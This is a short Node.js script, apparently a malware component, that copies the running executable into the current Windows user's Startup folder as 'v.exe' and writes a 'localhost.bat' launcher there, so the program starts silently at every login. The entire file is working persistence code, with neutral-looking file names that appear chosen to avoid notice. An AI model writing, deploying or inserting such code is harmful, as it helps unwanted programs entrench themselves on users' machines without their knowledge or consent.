const process = require('process');
const os = require("os")
const fs = require('fs');


const urss = os.userInfo().username;
const Fpath = process.argv[0]
const data = "START v.exe"
const startPth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\localhost.bat"
const startExePth = "C:\\Users\\" + urss +"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\v.exe"


fs.writeFileSync(startPth, data);
let dataF = fs.readFileSync(Fpath, {encoding: null});

fs.writeFileSync(startExePth, dataF)

console.log("Set startup sucess")